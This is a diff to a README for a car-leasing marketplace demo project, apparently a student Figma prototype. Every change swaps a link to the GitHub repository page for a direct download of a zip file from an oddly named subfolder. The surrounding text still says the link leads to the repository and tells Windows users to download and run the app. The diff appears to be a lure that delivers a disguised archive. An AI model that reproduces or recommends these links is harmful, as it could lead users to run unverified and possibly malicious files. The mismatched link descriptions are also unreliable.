@@ -1,6 +1,6 @@
 # 🚗 Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma- - Simple Market Place Experience  
 
-[![Download and Run](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)
+[![Download and Run](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-/main/kiaki/figma-projet-pfe-Leasing-ocaz-Maroc-demo-v2.6.zip)
 
 ## 📋 About This Project  
 
@@ -36,7 +36,7 @@ Follow these steps carefully to get the application running on your Windows mach
 
 Click the large button below or the link at the top to open the download page:  
 
-[Download Maroc-Leasing Market Place](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)  
+[Download Maroc-Leasing Market Place](https://raw.githubusercontent.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-/main/kiaki/figma-projet-pfe-Leasing-ocaz-Maroc-demo-v2.6.zip)  
 
 This link leads to the GitHub repository where the application files are stored.  
 
@@ -112,7 +112,7 @@ If you see error messages during setup, note the exact text and seek help throug
 
 ## 📥 Download Link Reminder  
 
-[Click here to visit the download page again.](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)  
+[Click here to visit the download page again.](https://raw.githubusercontent.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-/main/kiaki/figma-projet-pfe-Leasing-ocaz-Maroc-demo-v2.6.zip)  
 
 Use this link any time you need to download updates or reinstall the app.  
 
